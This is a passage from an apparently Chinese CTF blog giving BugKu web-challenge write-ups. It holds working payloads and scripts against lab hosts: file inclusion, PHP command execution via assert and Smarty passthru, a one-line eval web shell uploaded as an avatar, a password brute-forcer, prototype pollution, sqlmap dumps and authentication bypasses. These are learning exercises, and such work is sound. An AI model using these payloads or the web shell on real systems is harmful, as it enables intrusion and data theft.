</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!$_GET[file])&#123;echo &#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;;&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">echo &quot;Oh no!&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">include($file); </span><br><span class="line">//flag:flag&#123;ee54957897543831f6aa21d30f46913d&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="方法2-1"><a href="#方法2-1" class="headerlink" title="方法2"></a>方法2</h3><p>也可以直接构造该payload获得flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10060/index.php?file=//flag</span><br></pre></td></tr></table></figure><h2 id="好像需要密码"><a href="#好像需要密码" class="headerlink" title="好像需要密码"></a>好像需要密码</h2><p>直接5位纯数字爆破（密码是12468)，exp如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">lens = <span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">password = <span class="built_in">str</span>(password)</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(password)&lt;lens):</span><br><span class="line">diff = lens-<span class="built_in">len</span>(password)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(diff):</span><br><span class="line">password = <span class="string">&#x27;0&#x27;</span> + password</span><br><span class="line">test = requests.post(<span class="string">&#x27;http://114.67.175.224:15735/&#x27;</span>,data=&#123;<span class="string">&#x27;pwd&#x27;</span>: password&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;当前测试的密码为：&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> test.text:</span><br><span class="line">flag = re.findall(<span class="string">&quot;flag\&#123;(.*)?\&#125;&quot;</span>,test.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]正确的密码为：&#x27;</span>,password)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*]flag&#123;&#x27;</span>+flag[<span class="number">0</span>]+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/3dtQCz5cogAI9F4.png" alt="password.png"></p><h2 id="No-one-knows-regex-better-than-me"><a href="#No-one-knows-regex-better-than-me" class="headerlink" title="No one knows regex better than me"></a>No one knows regex better than me</h2><p>打开网页即可获得源码，本地分析源码测试如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$zero</span> = <span class="string">&quot;\\ZmxhZw==&quot;</span>; <span class="comment">//&#x27;ZmxhZw==&#x27;是flag的base64编码</span></span><br><span class="line"><span class="variable">$first</span>=<span class="string">&quot;ag/\\|.php&quot;</span>;</span><br><span class="line"><span class="variable">$second</span>=<span class="variable">$zero</span>.<span class="variable">$first</span>;</span><br><span class="line"><span class="comment">// echo $second;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,<span class="variable">$second</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[1]&quot;</span>;</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$second</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.\.|flag/&quot;</span>,<span class="variable">$key</span>))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Noooood hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[2]&quot;</span>;</span><br><span class="line">        <span class="variable">$third</span>=<span class="variable">$first</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,<span class="variable">$third</span>))&#123; <span class="comment">// |.php</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[3]&quot;</span>;</span><br><span class="line">            <span class="variable">$end</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$third</span>,<span class="number">5</span>);</span><br><span class="line">            <span class="comment">// echo $zero;</span></span><br><span class="line">            <span class="comment">// echo $end;</span></span><br><span class="line">            <span class="comment">// highlight_file(base64_decode($zero).$end);//maybe flag in flag.php</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$zero</span>).<span class="variable">$end</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fail!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写脚本提交即可，exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:17373/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;zero&#x27;</span>:<span class="string">&quot;\\ZmxhZw==&quot;</span>, <span class="comment">#ZmxhZw==</span></span><br><span class="line"><span class="string">&#x27;first&#x27;</span>:<span class="string">&quot;ag/\\|.php&quot;</span> <span class="comment">#aaaa|.php</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data);</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/V5Yd92Ri3HZNUvW.png" alt="better_re.png"></p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>先查看提示，分析后如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;a#s#s#e#r#t&quot;</span>;</span><br><span class="line"><span class="variable">$poc_1</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$poc</span>);</span><br><span class="line"><span class="comment">//print_r($poc_1);</span></span><br><span class="line"><span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>];</span><br><span class="line"><span class="comment">//print_r($poc_2);</span></span><br><span class="line"><span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]); <span class="comment">//assert($_GET[&#x27;s&#x27;])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现传入s即可，故构造payload，先执行ls命令查看有哪些文件</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11841/?s=system(%27ls%27)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/esdpv8BWliSRng4.png" alt="shell1.png"></p><p>查看该txt文件即可获得flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11841/?s=system(%27cat%20flaga15808abee46a1d5.txt%27)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/8DhOGmWrz93K6wd.png" alt="shell2.png"></p><h2 id="聪明的php"><a href="#聪明的php" class="headerlink" title="聪明的php"></a>聪明的php</h2><p>随意传参得到源码提示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> AS <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123;          </span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;./template.html&#x27;</span>);                 </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>可以看到system等命令已经被禁用了，故使用passthru来执行命令</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15783/index.php?a=&#123;passthru(%27ls%20-al%20/%27)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/wRp7dIuoJKUT8AE.png" alt="php1.png"></p><p>发现一个很可疑文件，去读取即可获得flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15783/index.php?a=&#123;passthru(%27tac%20/_7782%27)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/NYuIkAJXHZKewjq.png" alt="php2.png"></p><blockquote><p>有关程序执行可看此网站：<a href="https://www.php.net/exec">PHP程序执行</a></p><p>参考wp：<a href="https://zhuanlan.zhihu.com/p/401583380">BugKu-Web-wp1</a></p></blockquote><h2 id="xxx二手交易市场"><a href="#xxx二手交易市场" class="headerlink" title="xxx二手交易市场"></a>xxx二手交易市场</h2><p>看了一圈发现没什么东西，注册账号登录，发现可以上传头，故进行图片上传并抓包，发现图片是用base64编码的，故构造一句话木马传进去（注意使用base64编码，且前面的jpeg要改为php）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/m6kYFzCrnJpso98.png" alt="xxxx1.png"></p><p>用中国蚁剑连接传入php文件地址（密码为cmd），翻找后获得flag。</p><p><img src="https://s2.loli.net/2022/04/27/zIYa4Xc39OCHf7L.png" alt="xxxx2.png"></p><h2 id="闪电十六鞭"><a href="#闪电十六鞭" class="headerlink" title="闪电十六鞭"></a>闪电十六鞭</h2><p>打开网页即可获得源码，分析后构造payload即可获得flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:17903/?flag=$a=%27flaa%27;$a&#123;3&#125;=%27g%27;?%3E%3C?=$$a;?%3Ebbbbbbbbbbbbbbbbbb</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/zra8M3yHTnWsIeo.png" alt="teacherma.png"></p><blockquote><p>参考wp：<a href="https://blog.csdn.net/weixin_58111246/article/details/123971455?spm=1001.2014.3001.5501">BugKu-Web-wp2</a></p></blockquote><h2 id="sodirty"><a href="#sodirty" class="headerlink" title="sodirty"></a>sodirty</h2><p>用御剑扫一遍发现<code>www.zip</code></p><p><img src="https://s2.loli.net/2022/04/27/Iv5dpC3bAocHKXt.png" alt="dirty1.png"></p><p>解压后，重点看routes下的index.js文件，其中，getflag是我们获取flag的地方</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/getflag&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">password</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">password</span> === req.<span class="property">session</span>.<span class="property">challenger</span>.<span class="property">password</span>)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">challenger</span>.<span class="property">age</span> &gt; <span class="number">79</span>)&#123;  <span class="comment">//  age&lt;=79</span></span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;糟老头子坏滴很&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">key</span>.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">Admin</span>[key] === password)&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(process.<span class="property">env</span>.<span class="property">flag</span> ? process.<span class="property">env</span>.<span class="property">flag</span> : <span class="string">&quot;flag&#123;test&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;密码错误，请使用管理员用户名登录.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>update可以更新键值对，是我们主要要利用的函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/update&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">challenger</span> === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/reg&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">attrkey</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">attrval</span> === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;传参有误&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">attrkey</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">let</span> value = req.<span class="property">body</span>.<span class="property">attrval</span>.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="title function_">setFn</span>(req.<span class="property">session</span>.<span class="property">challenger</span>, key, value);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>故构造exp如下即可获得flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = requests.session()  <span class="comment">#要保持同一会话</span></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:19460&quot;</span></span><br><span class="line">reg = s.get(url+<span class="string">&#x27;/reg&#x27;</span>)</span><br><span class="line"><span class="comment"># print(reg.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;attrkey&#x27;</span>:<span class="string">&#x27;age&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;attrval&#x27;</span>:<span class="number">79</span></span><br><span class="line">&#125;</span><br><span class="line">update_age = s.post(url+<span class="string">&#x27;/update&#x27;</span>,data=data)</span><br><span class="line"><span class="comment"># print(update_age.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;attrkey&#x27;</span>:<span class="string">&#x27;__proto__.pwd&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;attrval&#x27;</span>:<span class="number">123</span></span><br><span class="line">&#125;</span><br><span class="line">update_info = s.post(url+<span class="string">&#x27;/update&#x27;</span>,data=data)</span><br><span class="line"><span class="comment"># print(update_info.text)</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="number">123</span>,</span><br><span class="line"><span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;pwd&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = s.post(url=url+<span class="string">&#x27;/getflag&#x27;</span>,data=data);</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://www.jianshu.com/p/2dbb1b38de1e">BugKu-Web-wp3</a></p></blockquote><h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><p>打开网页获得源码，本地分析</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// highlight_file(&#x27;2.php&#x27;);</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] = <span class="string">&#x27;keykeyaaaaakey:/a/keya.&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//  [[:punct:]]代表任何标点符号</span></span><br><span class="line"><span class="variable">$IM</span>= <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Fail!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload获取flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13051/?id=keykeyaaaaakey:/a/keya.</span><br></pre></td></tr></table></figure><blockquote><p>正则匹配规则：<a href="https://www.runoob.com/regexp/regexp-rule.html">正则表达式 - 匹配规则</a></p></blockquote><h2 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h2><p>查看网页源码发现code.txt，访问即可获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11845/?v1=QNKCDZO&amp;v2=s878926199a&amp;v3[]=1</span><br></pre></td></tr></table></figure><h2 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h2><p>尝试注册admin用户提示用户名已经存在，故猜测管理员账号用户名为admin</p><p><img src="https://s2.loli.net/2022/04/27/M4C7zaomdrfwk1q.png" alt="login1_1.png"></p><p>经过尝试发现未对空格过滤，故创建一个用户名为<code>‘admin ’</code>（即admin+空格）的账户登录即可</p><p><img src="https://s2.loli.net/2022/04/27/F7qpLaQ3dwZK24T.png" alt="login1_2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web 刷题记录2</title>
      <link href="/2022/04/25/BugKu-Web2/"/>
      <url>/2022/04/25/BugKu-Web2/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-刷题记录2"><a href="#BugKu-Web-刷题记录2" class="headerlink" title="BugKu Web 刷题记录2"></a>BugKu Web 刷题记录2</h1><blockquote><p>参考：</p><p><a href="https://www.secpulse.com/archives/137663.html">BugKu-Web-wp1</a></p><p><a href="https://www.secpulse.com/archives/140522.html">BugKu-Web-wp2</a></p><p><a href="https://blog.csdn.net/weixin_46578840/article/details/120140214?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&utm_relevant_index=4">get-shell-wp1</a></p><p><a href="https://blog.csdn.net/weixin_52116519/article/details/123962077">get-shell-wp2</a></p></blockquote><h2 id="成绩查询"><a href="#成绩查询" class="headerlink" title="成绩查询"></a>成绩查询</h2><p>使用sqlmap进行注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs</span><br></pre></td></tr></table></figure><p>发现爆出来四个数据库名字</p><p><img src="https://s2.loli.net/2022/04/25/E9fdTwOpDxB7Y4j.png" alt="score1.png"></p><p>其中skctf很可疑，去爆其中表名</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs -D skctf --tables</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/ui3TogqRI6XrKp2.png" alt="score2.png"></p><p>可以猜测，flag就在f14g中，故去爆其中字段</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs -D skctf -T fl4g --columns</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/h5S6VBsPbtJoIHz.png" alt="score3.png"></p><p>可以看到，fl4g表中有一个名为skctf_flag字段，得到其字段信息即可。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> sqlmap.py -u http://114.67.175.224:16892/ --forms --dbs -D skctf -T fl4g -C skctf_flag --dump</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/oerldNR6xyZ2Qu9.png" alt="score4.png"></p><h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><p>打开网页后发现需要2秒内计算出结果返回，故编写脚本实现</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.175.224:13247/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">sess = requests.Session() <span class="comment">#保持当前连接不断</span></span><br><span class="line">response = sess.post(url=url,headers=headers)  <span class="comment">#不要加cookie</span></span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#自动解码</span></span><br><span class="line">html_data = response.text</span><br><span class="line"><span class="comment"># print(html_data)</span></span><br><span class="line">data = re.findall(<span class="string">&#x27;&lt;div&gt;(.*)?=\?;&lt;/div&gt;&#x27;</span>,html_data)</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line">ans = &#123;</span><br><span class="line"><span class="string">&#x27;value&#x27;</span>:<span class="built_in">eval</span>(data[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># print(ans[&#x27;value&#x27;])</span></span><br><span class="line">r = sess.post(url=url,data = ans)</span><br><span class="line">r.encoding = r.apparent_encoding <span class="comment">#自动解码</span></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/TEkaGxVD7lodf8O.png" alt="driver.png"></p><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>查看源代码发现要传递margin字段</p><p><img src="https://s2.loli.net/2022/04/25/T3p4Eu2e5ryvVdG.png" alt="fast1.png"></p><p>使用burp抓包发现flag字段</p><p><img src="https://s2.loli.net/2022/04/25/1YRyBwiXnAOqzJv.png" alt="fast2.png"></p><p>然后编写脚本进行post请求传递margin</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.175.224:16315/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">sess = requests.Session() <span class="comment">#保持当前连接不断</span></span><br><span class="line">response = sess.get(url=url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#自动解码</span></span><br><span class="line">head = response.headers</span><br><span class="line"><span class="comment"># print(head[&#x27;flag&#x27;])</span></span><br><span class="line">flag = base64.b64decode(head[<span class="string">&quot;flag&quot;</span>])</span><br><span class="line">flag = flag.decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">payload = base64.b64decode(flag.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;margin&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = sess.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>脚本运行后即可获得flag</p><p><img src="https://s2.loli.net/2022/04/25/EfrAC3xY6w7ZqRm.png" alt="fast3.png"></p><h2 id="cookies"><a href="#cookies" class="headerlink" 